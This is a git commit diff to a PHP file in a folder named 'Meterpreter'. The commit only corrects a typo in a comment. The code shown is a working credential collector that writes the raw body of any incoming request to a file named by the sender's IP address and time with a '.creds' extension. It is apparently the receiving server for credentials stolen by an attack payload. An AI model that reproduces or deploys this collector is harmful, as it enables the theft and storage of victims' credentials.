4f0a7a05e9ff969d2712d75870a36730d2fdf000
Hau Trung Nguyen <haunt.hcm2015@gmail.com>
2019-01-31 17:41:48 +0700

    Update pass.php

--- Meterpreter/pass.php
+++ Meterpreter/pass.php
@@ -1,5 +1,5 @@
 ﻿<?php
-// Genrate a new file with structure IP-date.creds
+// Generate a new file with structure IP-date.creds
 $file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
 file_put_contents($file, file_get_contents("php://input"));
 ?>
